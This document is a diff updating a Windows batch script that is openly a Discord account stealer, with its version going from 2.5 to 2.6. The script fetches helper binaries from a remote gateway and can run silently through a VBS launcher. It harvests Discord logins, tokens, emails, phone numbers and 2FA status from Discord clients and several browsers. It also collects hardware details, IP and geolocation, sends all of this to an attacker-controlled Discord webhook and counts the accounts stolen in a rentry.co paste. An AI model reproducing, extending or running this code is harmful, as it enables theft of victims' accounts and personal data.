@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: <Settings>
-set "Version=2.5"
+set "Version=2.6"
 set "APIPasswords=V4KG2CPM-QXWU4PM2"
 set FilesDB=DiscordMSG.bat notifu.exe WebParse.exe DAS.exe rentry.exe nonAscii.exe
 set "pasteLocation=%temp%\DAS v!Version!\WebPaste.txt"
@@ -13,157 +13,192 @@ set "EncodeLength=4"
 set "ENCODE.LOWER[/]=djFW" & set "DECODE.LOWER[djFW]=/"
 set "UpperList="2YDU/A" "NZ0f/B" "QJ0W/C" "Zwbf/D" "LVH8/E" "g594/F" "5CWA/G" "2B3A/H" "p1A8/I" "VRDo/J" "QM2j/K" "aIv7/L" "rrRR/M" "fQWj/N" "tJpk/O" "CZPX/P" "vFo3/Q" "txZ1/R" "V2az/S" "pNmX/T" "qwyH/U" "vzrr/V" "dQ7T/W" "2kXz/X" "iC8D/Y" "HIBG/Z""
 set "LowerList="6ZAU/a" "VhHA/b" "t686/c" "dn7a/d" "WXMe/e" "ChDC/f" "hxxm/g" "IgTb/h" "X640/i" "9YO8/j" "lzCG/k" "kXkt/l" "G0hn/m" "pGm7/n" "XtTR/o" "PPbL/p" "4eyF/q" "QQt3/r" "NeHv/s" "3Nkg/t" "1k8o/u" "kDzt/v" "Q0ei/w" "ad9n/x" "xM9N/y" "sxK7/z" "CQGN/1" "VxhF/2" "5fts/3" "VT2m/4" "w7Ep/5" "BSVp/6" "ru3k/7" "KrbV/8" "CFso/9" "GyeH/0" "XxDP/ " "Cr0O/." "vhV1/-" "g6uZ/+" "UEEQ/$" "JD9X/_" "AmbC/#" "jp5b/@" "iXuP/^^" "yr1b/^&" "nSX4/^(" "xKcE/^)" "BYoT/[" "GosV/]" "mx2X/{" "DnFj/}" "dGaP/^|" "9MBD/^<" "fNOw/^>" "7tkc/^\" "aAZc/'" "aHgW/~" "OlSn/`" "boIx/;" "VkPR/%%" "437F/"""
-set "Builds=Stable PTB Canary Developer Chrome Edge Opera Brave Yandex"
 :: </Settings>
 
-if "%~1"=="--Background" (
-    >"%temp%\background.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """ " ^& WScript.Arguments^(1^), 0
-    exit /b
-)
+set black=[30m
+set yellow=[33m
+set green=[32m
+set white=[37m
+set grey=[90m
+set brightred=[91m
+set brightblue=[94m
 
-:: <Download Missing Files>
+set "PrintCore=     !grey!$ [!brightblue!%username%!grey!]"
+set "ErrPrintCore=     !brightred!$ !grey![!brightblue!%username%!grey!]"
+set "WrnPrintCore=     !yellow!$ !grey![!brightblue!%username%!grey!]"
+
+echo.
+echo !PrintCore! Launching Application - Version ^(!Version!^) . . .!white!
+
+:: <Parameters System>
+set notLegacy=%~2
+if not defined notLegacy set Identifier=%~1
+for %%a in (%*) do (
+    set /a Args.length+=1
+    if /i "%%a"==""--background"" (
+        set "Arg[!Args.length!]=%%~a"
+    ) else ( set "Arg[!Args.length!]=%%a" )
+)
+for /L %%a in (1 1 !Args.length!) do (
+    for %%b in ("identifier" "builds" "background") do (
+        if /i "!Arg[%%a]!"=="--%%~b" (
+            set nextArg=%%a
+            set /a nextArg+=1
+            if /i "%%~b"=="identifier" (
+                for /f "delims=" %%c in ("!nextArg!") do (
+                    set "Identifier=!Arg[%%c]!"
+                    set Identifier=!Identifier:"=!
+                )
+            )
+            if /i "%%~b"=="builds" (
+                for /f "delims=" %%c in ("!nextArg!") do (
+                    set "Builds=!Arg[%%c]!"
+                    set Builds=!Builds:"=!
+                )
+            )
+            if /i "%%~b"=="background" (
+                >"%temp%\background.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """ " ^& WScript.Arguments^(1^), 0
+                echo.
+                echo !PrintCore! Silent Mode file has been created . . .
+                echo.
+                echo !WrnPrintCore! Exiting Program.!white!
+                exit /b
+            )
+        )
+    )
+)
+title Loading . . .
+for %%a in (Stable PTB Canary Developer Chrome Edge Opera Brave Yandex) do (
+    echo !Builds! | findstr /ic:"%%a">nul 2>&1 && set "ValidateBuilds=!ValidateBuilds! %%a"
+)
+set "Builds=!ValidateBuilds:~1!"
+if not "!Builds!"=="~1" (
+    echo.
+    echo !PrintCore! Sending Specific Builds ; !Builds: =, !.
+    )
+if "!Builds!"=="~1" set "Builds=Stable PTB Canary Developer Chrome Edge Opera Brave Yandex"
+:: </Parameters System>
+
+:: <Download Files And Expand Archive>
 for %%a in (!FilesDB!) do if not exist "%temp%\DAS v!Version!\%%a" set /a MissingFiles+=1
-
-if !MissingFiles! geq 1 (
-    for %%a in (!FilesDB!) do (
-        set /a Downloaded+=1
-        cls
-        echo.
-        echo  Downloading File !Downloaded!/!MissingFiles!
-        curl --create-dirs -f#kLo "%temp%\DAS v!Version!\%%a" "!DefaultGateway!/%%a"
+if !MissingFiles! gtr 0 (
+    echo.
+    echo !PrintCore! Downloading Files . . .
+    for %%a in ("DiscordMSG.bat" "binary.zip") do (
+        curl --create-dirs --ssl-no-revoke -f#kLo "%temp%\DAS v!Version!\%%~a" "!DefaultGateway!/%%~a"
     )
-cls
+    chcp 437>nul
+    cmd /c exit
+    echo.
+    echo !PrintCore! Expanding Archive . . .!white!
+    powershell -command "$ProgressPreference = 'SilentlyContinue'; Expand-Archive '%temp%\DAS v!Version!\binary.zip' -DestinationPath '%temp%\DAS v!Version!' -Force"
+    chcp 65001>nul
+    del /q "%temp%\DAS v!Version!\binary.zip"
 )
-:: <Download Missing Files>
-
-:: <Load Parameters>
-set "Identifier=%~1"
-:: </Load Parameters>
-
-:: <Apply Settings>
-for %%a in (!UpperList!) do (
-    for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
-        set "ENCODE.CAPS[%%c]=%%b"
-        set "DECODE.CAPS[%%b]=%%c"
-    )
+for %%a in (!FilesDB!) do (
+    set /a File.Length+=1
+    set "File[!File.Length!]=%temp%\DAS v!Version!\%%a"
 )
-for %%a in (!LowerList!) do (
-    for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
-        set "ENCODE.LOWER[%%c]=%%b"
-        set "DECODE.LOWER[%%b]=%%c"
-    )
+:: </Download Files And Expand Archive>
+
+:: <Load Encoder & Decoder>
+for %%a in (!UpperList!) do for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
+    set "ENCODE.CAPS[%%c]=%%b"
+    set "DECODE.CAPS[%%b]=%%c"
+)
+for %%a in (!LowerList!) do for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
+    set "ENCODE.LOWER[%%c]=%%b"
+    set "DECODE.LOWER[%%b]=%%c"
 )
 for %%a in (!APIPasswords!) do (
     set /a APIPasswords.Length+=1
     set "APIPassword[!APIPasswords.Length!]=%%a"
 )
-
-for %%a in (!FilesDB!) do (
-    set /a Files.Length+=1
-    set "Files[!Files.Length!]=%temp%\DAS v!Version!\%%a"
-)
-
-:: </Apply Settings>
+:: </Load Encoder & Decoder>
 
 :: <Load Identifier>
 if not defined Identifier set Identifier=!DefaultIdentifier!
 set "IdentifierURL=!DefaultGateway!/identifiers/!Identifier!.json?raw=true"
-for /f %%A in ('curl --silent "!IdentifierURL!"') do set "LINK_TYPE=%%A"
+for /f %%A in ('curl --ssl-no-revoke --silent "!IdentifierURL!"') do set "LINK_TYPE=%%A"
 if not "%LINK_TYPE%"=="<html><body>You" (
-    set ERROR=Identifier not found
-    goto :CHECK_ERRORS
+    set Show_Notifications=true
+    set "APP_Nickname=System"
+    call :ERRORS "false" "-" "Couldn't find the identifier specified." "{NT}" "false"
 )
-for /f "delims=" %%a in ('call "!Files[3]!" "!IdentifierURL!" !JsonValues!') do set "Json.%%a"
-
+for /f "delims=" %%a in ('call "!File[3]!" "!IdentifierURL!" !JsonValues!') do set "Json.%%a"
 for %%a in (ID Endpoint Access) do (
     call :DECODE "!Json.author.%%a!"
     set "Json.author.%%a=!DecodedString!"
 )
+if "!Json.version!"=="2.5" set "Json.version=2.6"
 set "WebURL=https://rentry.co/!Json.author.Endpoint!"
 set "PermaAccess=!Json.author.Access!"
-
-if /i "!json.Enabled!"=="false" (
-    if not defined ERROR set ERROR=This Identifier is disabled
-    set Show_Notifications=true
-    set "APP_Nickname=System"
-    goto :CHECK_ERRORS
-)
-if not defined ERROR if not "!json.version!"=="!Version!" (
-    if not defined ERROR set ERROR=Identifier Incompatible with this version
-)
-:: <Load Paste of Identifier>
-if not defined ERROR call :CHECK_CONNECTION
-if not defined ERROR call :GetPasteStatus
-
-for /f "delims=" %%a in ('curl -k -s "!WebURL!/raw"') do <nul set /p="%%a" | >nul findstr /rc:"^[\[#].*" || set "%%a">nul 2>&1
-
-for %%a in (Webhook Error_Color Success_Color Success_Image Error_Image Success_Title Error_Title Success_Description Error_Description Show_Notifications APP_Nickname Hide_Mail Hide_Phone Hide_Token SendUnclaimedAccounts DATABASE) do (
-    if not defined %%a (
-        REM if not defined ERROR ????
-        if not defined ERROR set ERROR=Settings Missing from paste
-        goto :CHECK_ERRORS
-    )
-)
-call :DATABASE 0
-
-if not defined ERROR call :Validate_Webhook
-:: </Load Paste of Identifier>
+set IdentifierDATA=!Error_Description!
+set "IdentifierDATA=!IdentifierDATA:{AccountsStolen}=%AccountsStolen%!"
+call :LoadMessagePlaceHolders
 :: </Load Identifier>
 
-:: <Account Collection>
-for /f "delims=" %%a in ('call "!Files[4]!" !APIPassword[1]!') do set "%%a"
+:: <Check META DATA>
+ for %%a in ("2.6") do if "%%~a"=="!Json.version!" set compatible=true
+ if not "!Compatible!"=="true" (
+     set Show_Notifications=true
+     set "APP_Nickname=System"
+     call :ERRORS "false" "The Version of the identifier\ndid not match the program version ^(!version!^)" "This Identifier is incompatible with this version.\nIdentifier: !Json.token!" "{NT}" "false"
+ )
+  if /i "!json.Enabled!"=="false" (
+     set Show_Notifications=true
+     set "APP_Nickname=System"
+     call :ERRORS "false" "-" "This identifier is disabled.\nIdentifier: !Json.token!" "{NT}" "true"
+ )
+:: </Check META DATA>
 
-if defined Error (
-    set IdentifierDATA=!Error_Description!
-    for %%a in ("!AccountsStolen!") do set "IdentifierDATA=!IdentifierDATA:{AccountsStolen}=%%~a!"
-) else (
-    set IdentifierDATA=!Success_Description!
-    for %%a in ("!Failures!") do set "IdentifierDATA=!IdentifierDATA:{TotalFailures}=%%~a!"
-)
+:: <Get Software & Hardware information>
+ for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
+ for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
+ for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
+ for /f "delims=" %%a in ('call "!File[3]!" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
+:: </Get Software & Hardware information>
 
-call :GET_HARDWARE
-call :GET_NETWORK
+:: <Load User Settings for the Identifier>
+call :CHECK_CONNECTION
+call :GetPasteStatus
 
-if "!proxy!"=="false" (
-    set "VPN=:red_circle: OFF"
-) else set "VPN=:green_circle: ON - :warning: Some Information may be incorrect"
-
-set "Country=!country! (!countryCode!)"
-set "Region=!regionName!"
-set "PCuser=!username!"
-set "IdentifierCreationDate=!Json.CreationDate!"
-set "IdentifierVersion=!Json.version!"
-set IdentifierDATA=!IdentifierDATA:{IdentifierToken}=[%Json.token%](%WebURL%)!
-set "IdentifierDATA=!IdentifierDATA:{IdentifierEditCode}=%PermaAccess%!"
-set PermaAccess=
-
-for %%a in (RAM CPU GPU COUNTRY VPN REGION CITY LAT LON TIMEZONE ISP QUERY COMPUTERNAME PCUSER IdentifierCreationDate IdentifierVersion) do (
-    for %%b in ("!%%a!") do set "IdentifierDATA=!IdentifierDATA:{%%a}=%%~b!"
-)
-
-if defined ERROR goto :CHECK_ERRORS
-:: </Account Collection>
-
-:: <Print Detials>
-if /i "!Show_Notifications!"=="true" start "" "!Files[2]!" /p "!APP_Nickname!" /m "The identifier has been successfully verified.\nIdentifier: !Json.token!\n" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
-echo.
-echo The Identifier has been successfully verified,
-echo   Identifier Token: !Json.token!
-:: <Print Detials>
-
-:: <Prepare and Send Account(s)>
-for %%a in (!Builds!) do (
-    if defined Discord_%%a_User (
-        set "BuildsFound=%%a !BuildsFound!"
+for /f "delims=" %%a in ('curl --ssl-no-revoke -k -s "!WebURL!/raw"') do <nul set /p="%%a" | >nul findstr /rc:"^[\[#].*" || set "%%a">nul 2>&1
+for %%a in (Webhook Error_Color Success_Color Success_Image Error_Image Success_Title Error_Title Success_Description Error_Description Show_Notifications APP_Nickname Hide_Mail Hide_Phone Hide_Token SendUnclaimedAccounts DATABASE) do (
+    if not defined %%a (
+        set Show_Notifications=true
+        set "APP_Nickname=System"
+        call :ERRORS "false" "-" "The Identifier is missing settings and the APP is unable to load.\nIdentifier: !Json.token!" "{NT}" "false"
     )
 )
+title !APP_Nickname!
+call :DATABASE 0
+call :Validate_Webhook
+:: </Load User Settings for the Identifier>
 
-if /i "!SendUnclaimedAccounts!"=="false" (
-    for %%a in (!BuildsFound!) do (
-        if /i "!Discord_%%a_Email!"=="none" (
-            set "BuildsFound=!BuildsFound:%%a =!"
-            set /a Accounts-=1
-        )
+:: <Collect Discord Builds Information>
+for /f "delims=" %%a in ('call "!File[4]!" !APIPassword[1]!') do set "%%a"
+if defined Error (
+    if "!Error!"=="Invalid password" call :ERRORS "true" "Discord Account Collection program key is invalid." "Program key provided is invalid." "{NT}" "false"
+    if "!Error!"=="Not supported" call :ERRORS "true" "This Discord Account Stealer version is no longer maintained, please use a newer version." "This version is no longer maintained, Please update to a newer version." "{NT}" "false"
+    if "!Error!"=="Discord not installed" call :ERRORS "true" "Looks Like the User does not have discord installed" "Discord is not installed, please install discord, login and try again." "{NT}" "true"
+    if "!Error!"=="User is not logged in" call :ERRORS "true" "Looks like this user is not logged in to any discord account." "This Looks like you have discord but you are not logged in." "{NT}" "true"
+)
+:: </Collect Discord Builds Information>
+
+:: <Prepare and Send Account(s)>
+set IdentifierDATA=!Success_Description!
+set "IdentifierDATA=!IdentifierDATA:{TotalFailures}=%Failures%!"
+call :LoadMessagePlaceHolders
+if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The identifier has been successfully verified.\nIdentifier: !Json.token!\n" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
+echo.
+echo !PrintCore! Identifier has been verified : !Json.token!!white!
+
+for %%a in (!Builds!) do if defined Discord_%%a_User set "BuildsFound=%%a !BuildsFound!"
+if /i "!SendUnclaimedAccounts!"=="false" for %%a in (!BuildsFound!) do (
+    if /i "!Discord_%%a_Email!"=="none" (
+        set "BuildsFound=!BuildsFound:%%a =!"
+        set /a Accounts-=1
     )
 )
 
@@ -177,15 +212,9 @@ if !Accounts! gtr 0 (
         set ImageURL=!Success_Image!
         set MessageTitle=!Success_Title!
         if "%%a"=="Stable" set "MessageBody=!MessageBody:{location}=%%a Discord!"
-        for %%b in (PTB Canary Developer) do (
-            if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=Discord %%b!"
-        )
-        for %%b in (Chrome Edge Opera Brave Yandex) do (
-            if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=%%b Browser!"
-        )
-        if "!Discord_%%a_Verified!"=="true" (
-            set "Discord_%%a_Verified=Verified"
-        ) else set "Discord_%%a_Verified=Unverified"
+        for %%b in (PTB Canary Developer) do if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=Discord %%b!"
+        for %%b in (Chrome Edge Opera Brave Yandex) do if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=%%b Browser!"
+        if "!Discord_%%a_Verified!"=="true" ( set "Discord_%%a_Verified=Verified" ) else set "Discord_%%a_Verified=Unverified"
         for %%b in (NSFW 2FA) do (
                 if "!Discord_%%a_%%b!"=="true" (
                 set "Discord_%%a_%%b=Enabled"
@@ -193,7 +222,7 @@ if !Accounts! gtr 0 (
         )
         set /a AccountsStolen+=1
         set ASCII_ERROR=
-        for /f "delims=" %%a in ('call "!files[6]!" "!Discord_%%a_User!"') do set "%%a" >nul
+        for /f "delims=" %%a in ('call "!File[6]!" "!Discord_%%a_User!"') do set "%%a" >nul
         if "!ASCII_ERROR!"=="Unknown Characters found" set "Discord_%%a_User=:warning: Can't Display Name"
         for %%b in ("!AccountsStolen!") do set "MessageBody=!MessageBody:{AccountsStolen}=%%~b!"
         for %%b in ("!Discord_%%a_User!") do set "MessageTitle=!Success_Title:{username}=%%~b!"
@@ -207,15 +236,42 @@ if !Accounts! gtr 0 (
         for %%b in ("!Discord_%%a_NSFW!") do set "MessageBody=!MessageBody:{nsfw}=%%~b!"
         for %%b in ("!Discord_%%a_2FA!") do set "MessageBody=!MessageBody:{2fa}=%%~b!"
         echo !ImageURL!| findstr /C:"{ImageURL}">nul && set "ImageURL=!Discord_%%a_ImageURL!"
-        call "!Files[1]!" -silent --embed "!MessageTitle!" "!MessageBody:\n=\\n!" "!Success_Color!" "!ImageURL!"
+        call "!File[1]!" +silent --embed "!MessageTitle!" "!MessageBody:\n=\\n!" "!Success_Color!" "!ImageURL!"
     )
 call :DATABASE 1
-)
-echo The Application has been successfully finished.
-if /i "!Show_Notifications!"=="true" start "" "!Files[2]!" /p "!APP_Nickname!" /m "The Application has been successfully finished." /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
-timeout /t 5 /nobreak >nul
+) else REM Send message no accounts sent
+echo.
+echo !PrintCore! The Application Has finished.
+if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname!" /m "The Application has been successfully finished." /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
+echo.
+echo !WrnPrintCore! Closing window in 10 seconds . . .!white!
+timeout /t 10 /nobreak >nul
 exit /b
 :: </Prepare and Send Account(s)>
+
+:: <Errors System - Actions for the Error>
+:ERRORS "true" "Discord Message Text" "Notification Text" "Print Error or {NT}" "<Stats> (true/false)"
+if defined APP_Nickname ( title !APP_Nickname! ^| ERROR ) else ( title System ^| ERROR)
+set "ErrorMessageBody=!IdentifierDATA!"
+set "ErrorDiscordText=%~2"
+set "NotificationText=%~3"
+set "PrintError=%~4"!
+set "AddStats=%~5"
+if "!AddStats!"=="true" (
+    set /a Failures+=1
+    call :DATABASE 1
+)
+echo.
+echo !ErrPrintCore! !PrintError:{NT}=%NotificationText:\n= %!
+set "ErrorMessageBody=!ErrorMessageBody:{TotalFailures}=%Failures%!"
+if /i "!Show_Notifications!"=="true" start "" "!File[2]!" /p "!APP_Nickname! | ERROR" /m "!NotificationText!" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,131
+set ErrorMessageBody=!ErrorMessageBody:{error}=%ErrorDiscordText%!
+if "%~1"=="true" call "!File[1]!" +silent --embed "!Error_Title!" "!ErrorMessageBody:\n=\\n!" "!Error_Color!" "!Error_Image!"
+echo.
+echo !WrnPrintCore! Closing window in 10 seconds . . .!white!
+timeout /t 10 /nobreak >nul
+exit
+:: </Errors System - Actions for the Error>
 
 :: <Decoder>
 :DECODE
@@ -266,23 +322,31 @@ exit /b
 :: <Discord Webhook Validator>
 :Validate_Webhook
  for %%a in (ptb canary) do set "Webhook=!Webhook:%%a.=!"
- if not "!Webhook:~0,33!"=="https://discord.com/api/webhooks/" set Invalid_Webhook=True
- for /F "tokens=* USEBACKQ" %%a in (`curl --silent "%webhook%"`) do set "WebhookCheck=%%a"
- for %%a in ("404: Not Found" "401: Unauthorized" "Invalid Webhook Token") do echo %WebhookCheck% | findstr /ic:%%a >nul && set "Invalid_Webhook=True"
- if "%Invalid_Webhook%"=="True" set "ERROR=Invalid Webhook URL"
+ if not "!Webhook:~0,33!"=="https://discord.com/api/webhooks/" set "ERROR=Invalid Webhook URL"
+ for /F "tokens=* USEBACKQ" %%a in (`curl --ssl-no-revoke --silent "%webhook%"`) do set "WebhookCheck=%%a"
+ for %%a in ("404: Not Found" "401: Unauthorized" "Invalid Webhook Token") do echo !WebhookCheck! | findstr /ic:%%a >nul && set "ERROR=Invalid Webhook URL"
+ if "!Error!"=="Invalid Webhook URL" call :ERRORS "false" "-" "Error Accured while verifing the identifier.\nIdentifier: !Json.token!" "Invalid Webhook URL for the identifier: !Json.token!." "false"
  exit /b
 :: </Discord Webhook Validator>
 
 :: <Rentry.co Status>
 :CHECK_CONNECTION
 ping rentry.co -n 1 | findstr "TTL" >nul
-if !ErrorLevel! equ 1 set "ERROR=Rentry.co is down"
+if !ErrorLevel! equ 1 (
+    set Show_Notifications=true
+    set "APP_Nickname=System"
+    call :ERRORS "false" "-" "Rentry.co was found to be offline." "{NT}" "false"
+    )
 exit /b
 :: </Rentry.co Status>
 
 :: <Check existence of rentry.co pastes>
 :GetPasteStatus
-for /f "tokens=*" %%a in ('curl -k -s "!WebURL!/raw"') do if "%%a"=="<!DOCTYPE html>" set "ERROR=Paste not found"
+for /f "tokens=*" %%a in ('curl --ssl-no-revoke -k -s "!WebURL!/raw"') do if "%%a"=="<!DOCTYPE html>" (
+    set Show_Notifications=true
+    set "APP_Nickname=System"
+    call :ERRORS "false" "-" "Couldn't find the paste specified.\nIdentifier: !Json.token!" "{NT}" "false"
+)
 exit /b
 :: <Check existence of rentry.co pastes>
 
@@ -299,101 +363,15 @@ if "%~1"=="1" (
     set "DATABASE=!AccountsStolen!+!Failures!"
     call :ENCODE "!DATABASE!"
     set "DATABASE=!EncodedString!"
-    REM CREATE FILE TO LOAD PASTE
     call :LOCAL_PASTE
-
-    for /f "delims=" %%a in ('type "!pasteLocation!" ^| call "!Files[5]!" edit -u "!WebURL!" --edit-code "!Json.author.Access!"') do (
+    for /f "delims=" %%a in ('type "!pasteLocation!" ^| call "!File[5]!" edit -u "!WebURL!" --edit-code "!Json.author.Access!"') do (
         set Rentry_ERROR=%%a
     )
     del "!pasteLocation!"
-    if "!Rentry_ERROR!"=="error: Invalid edit code" call "!Files[1]!" +silent --message "```ERROR: An error occurred while updating the database for the identifier '!Json.token!'\\nJoin our discord server to solve this issue : discord.gg/PUxp8KmRv5```"
+    if "!Rentry_ERROR!"=="error: Invalid edit code" call "!File[1]!" +silent --message "```ERROR: An error occurred while updating the database for the identifier '!Json.token!'\\nJoin our discord server to solve this issue : discord.gg/PUxp8KmRv5```"
 )
 exit /b
 :: </DATABASE>
-
-:CHECK_ERRORS
-if defined Error (
-    set "ErrorMessageBody=!IdentifierDATA!"
-    if "!Error!"=="Identifier not found" (
-        set Show_Notifications=true
-        set "APP_Nickname=System"
-        set "QueueNotification=Couldn't find the identifier specified."
-        echo ERROR: !QueueNotification!
-    )
-    if "!Error!"=="This Identifier is disabled" (
-        set DiscordMSG=false
-        set "QueueNotification=This identifier is disabled.\nIdentifier: !Json.token!"
-        echo ERROR: !QueueNotification:\n= !
-    )
-    if "!Error!"=="Identifier Incompatible with this version" (
-        set NoFailureStats=true
-        set ErrorDetail=The Version of the identifier\ndid not match the program version ^(!version!^)
-        set "QueueNotification=This Identifier is incompatible with this version.\nIdentifier: !Json.token!"
-        echo ERROR: !QueueNotification:\n= !
-    )
-    if "!Error!"=="Invalid Webhook URL" (
-        set "QueueNotification=Error Accured while verifing the identifier.\nIdentifier: !Json.token!"
-        echo ERROR: Invalid Webhook URL for the identifier: !Json.token!.
-    )
-    if "!Error!"=="Rentry.co is down" (
-        set "QueueNotification=Rentry.co was found to be offline."
-        echo ERROR: !QueueNotification:\n= !
-    )
-    if "!Error!"=="Paste not found" (
-        set "QueueNotification=Couldn't find the paste specified.\nIdentifier: !Json.token!"
-        echo ERROR: !QueueNotification:\n= !
-    )
-    if "!Error!"=="Settings Missing from paste" (
-        set DiscordMSG=false
-        set "QueueNotification=The Identifier is missing settings and the APP is unable to load.\nIdentifier: !Json.token!"
-        echo ERROR: !QueueNotification:\n= !
-    )
-    if "!Error!"=="Invalid password" (
-        set NoFailureStats=true
-        set ErrorDetail=Discord Account Collection program key is invalid.
-        set "QueueNotification=Program key provided is invalid."
-        echo ERROR: !QueueNotification!
-    )
-    if "!Error!"=="Not supported" (
-        set NoFailureStats=true
-        set ErrorDetail=This Discord Account Stealer version is no longer maintained, please use a newer version.
-        set "QueueNotification=This version is no longer maintained, Please update to a newer version."
-        echo ERROR: !QueueNotification!
-    )
-    if "!Error!"=="Discord not installed" (
-        set ErrorDetail=Looks Like the User does not have discord installed
-        set "QueueNotification=Discord is not installed, please install discord, login and try again."
-        echo ERROR: !QueueNotification!
-    )
-    if "!Error!"=="User is not logged in" (
-        set ErrorDetail=Looks like The User does not have discord installed!
-        set "QueueNotification=This Looks like you have discord but you are not logged in."
-        echo ERROR: !QueueNotification!
-    )
-    if defined ErrorDetail (
-        if not "!NoFailureStats!"=="true" (
-            set /a Failures+=1
-            call :DATABASE 1
-        )
-    )
-    for %%b in ("!Failures!") do set "ErrorMessageBody=!ErrorMessageBody:{TotalFailures}=%%~b!"
-    if /i "!Show_Notifications!"=="true" start "" "!Files[2]!" /p "!APP_Nickname! | ERROR" /m "!QueueNotification!" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,131
-    for /f "delims=" %%a in ("!ErrorDetail!") do set ErrorMessageBody=!ErrorMessageBody:{error}=%%~a!
-    if not "!DiscordMSG!"=="false" call "!Files[1]!" +silent --embed "!Error_Title!" "!ErrorMessageBody:\n=\\n!" "!Error_Color!" "!Error_Image!"
-    timeout /t 5 /nobreak >nul
-    exit /b
-)
-
-:GET_HARDWARE
-for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
-for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
-for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
-exit /b
-
-:GET_NETWORK
-for /f "delims=" %%a in ('call "!Files[3]!" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
-exit /b
-
 
 :: <Update Paste Locally>
 :LOCAL_PASTE
@@ -433,3 +411,20 @@ exit /b
 exit /b
 :: </Update Paste Locally>
 
+:: <Load Message Placeholders>
+:LoadMessagePlaceHolders
+if "!proxy!"=="false" (
+    set "VPN=:red_circle: OFF"
+) else set "VPN=:green_circle: ON - :warning: Some Information may be incorrect"
+set "Country=!country! (!countryCode!)"
+set "Region=!regionName!"
+set "PCuser=!username!"
+set "IdentifierCreationDate=!Json.CreationDate!"
+set "IdentifierVersion=!Json.version!"
+set IdentifierDATA=!IdentifierDATA:{IdentifierToken}=[%Json.token%](%WebURL%)!
+set "IdentifierDATA=!IdentifierDATA:{IdentifierEditCode}=%PermaAccess%!"
+for %%a in (RAM CPU GPU COUNTRY VPN REGION CITY LAT LON TIMEZONE ISP QUERY COMPUTERNAME PCUSER IdentifierCreationDate IdentifierVersion) do (
+    for %%b in ("!%%a!") do set "IdentifierDATA=!IdentifierDATA:{%%a}=%%~b!"
+)
+exit /b
+:: </Load Message Placeholders>
